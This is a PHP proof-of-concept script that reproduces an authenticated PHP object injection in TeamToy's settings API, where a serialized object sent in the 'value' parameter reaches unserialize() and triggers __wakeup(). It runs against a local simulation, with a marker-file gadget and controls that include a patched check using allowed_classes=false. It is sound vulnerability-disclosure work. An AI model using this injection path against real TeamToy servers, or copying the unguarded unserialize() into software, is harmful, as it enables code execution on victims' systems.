<?php
require __DIR__ . '/vulnerable_app/teamtoy_api_sim.php';

$GLOBALS['TEAMTOY_POC_MARKER'] = sys_get_temp_dir() . '/teamtoy_poc_wakeup_marker.log';

function print_json(string $label, $value): void
{
    echo $label . PHP_EOL;
    echo json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . PHP_EOL;
}

function assert_true(bool $condition, string $passMessage, string $failMessage): void
{
    if (!$condition) {
        fwrite(STDERR, "[FAIL] " . $failMessage . PHP_EOL);
        exit(1);
    }
    echo "[PASS] " . $passMessage . PHP_EOL;
}

function marker_exists(): bool
{
    return file_exists($GLOBALS['TEAMTOY_POC_MARKER']);
}

function marker_contents(): string
{
    return marker_exists() ? trim(file_get_contents($GLOBALS['TEAMTOY_POC_MARKER'])) : '';
}

function reset_marker(): void
{
    if (marker_exists()) {
        unlink($GLOBALS['TEAMTOY_POC_MARKER']);
    }
}

TeamToyApiSim::resetState();
TeamToyApiSim::seedToken('valid-user-token', 1001);
reset_marker();

$payload = serialize(new TeamToyPoCProbe());

print_json('[*] PoC context:', [
    'finding' => 'easychen/TeamToy CAND-13e7a27a275b',
    'vulnerability' => 'Authenticated PHP object injection / insecure deserialization',
    'endpoint' => 'index.php?c=api&a=user_update_settings',
    'source' => '$_REQUEST["value"] via v("value")',
    'sink' => 'unserialize(v("value"))',
    'payload' => $payload,
    'safety' => 'Local-only simulation. The gadget only writes a marker file under /tmp and never executes a command or contacts a network service.',
]);

echo PHP_EOL . '[*] Control 1: object payload without token.' . PHP_EOL;
$noToken = TeamToyApiSim::handle([
    'key' => 'poc',
    'value' => $payload,
]);
print_json('[*] No-token result:', [
    'response' => $noToken,
    'marker_exists' => marker_exists(),
    'marker' => marker_contents(),
]);
assert_true(
    $noToken['http_status'] === 401 && !marker_exists(),
    'Unauthenticated request is rejected before unserialize().',
    'Unauthenticated request should not reach the unserialize sink.'
);

echo PHP_EOL . '[*] Attack: valid token + serialized object in value parameter.' . PHP_EOL;
reset_marker();
$attack = TeamToyApiSim::handle([
    'token' => 'valid-user-token',
    'key' => 'poc',
    'value' => $payload,
]);
print_json('[*] Vulnerable result:', [
    'response' => $attack,
    'marker_exists' => marker_exists(),
    'marker' => marker_contents(),
]);
assert_true(
    $attack['http_status'] === 400 && marker_exists(),
    'Vulnerability reproduced: valid-token request invoked __wakeup() before the later is_array() rejection.',
    'Expected object __wakeup() to run even though the endpoint returns VALUE error.'
);

echo PHP_EOL . '[*] Positive control: normal serialized array remains accepted by the vulnerable endpoint.' . PHP_EOL;
reset_marker();
$normalArray = serialize(['theme' => 'dark']);
$normal = TeamToyApiSim::handle([
    'token' => 'valid-user-token',
    'key' => 'ui_options',
    'value' => $normalArray,
]);
print_json('[*] Serialized-array result:', [
    'request_value' => $normalArray,
    'response' => $normal,
    'stored_settings' => TeamToyApiSim::getSettings(1001),
    'marker_exists' => marker_exists(),
]);
assert_true(
    $normal['http_status'] === 200 && !marker_exists(),
    'Normal serialized array update still works; the PoC isolates object injection, not generic setting updates.',
    'Serialized-array compatibility control failed.'
);

echo PHP_EOL . '[*] Patched control: same object payload with allowed_classes=false.' . PHP_EOL;
reset_marker();
$patched = TeamToyApiSim::handle([
    'token' => 'valid-user-token',
    'key' => 'poc',
    'value' => $payload,
], true);
print_json('[*] Patched result:', [
    'response' => $patched,
    'marker_exists' => marker_exists(),
    'marker' => marker_contents(),
]);
assert_true(
    $patched['http_status'] === 400 && !marker_exists(),
    'Patched control passed: allowed_classes=false rejects the object without invoking __wakeup().',
    'Patched control should reject object payload without invoking magic methods.'
);

echo PHP_EOL . 'VULNERABLE: TeamToy CAND-13e7a27a275b reproduced successfully.' . PHP_EOL;
